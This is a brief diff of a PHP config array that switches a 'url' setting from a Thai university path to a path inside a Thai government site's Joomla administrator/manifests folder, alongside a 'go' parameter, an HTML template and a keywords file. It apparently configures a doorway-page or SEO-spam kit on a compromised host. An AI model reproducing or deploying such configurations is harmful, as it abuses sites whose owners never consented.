@@ -1,6 +1,6 @@
 <?php
 $config = array(
-        'url'		=> 'https://agri.kps.ku.ac.th/sile/',
+        'url'		=> 'https://www.lp-pao.go.th/Main60/administrator/manifests/files/sile/',
         'parameter' => 'go',
         'template'  => 'temp.html',
         'keywords'  => 'bb.txt',
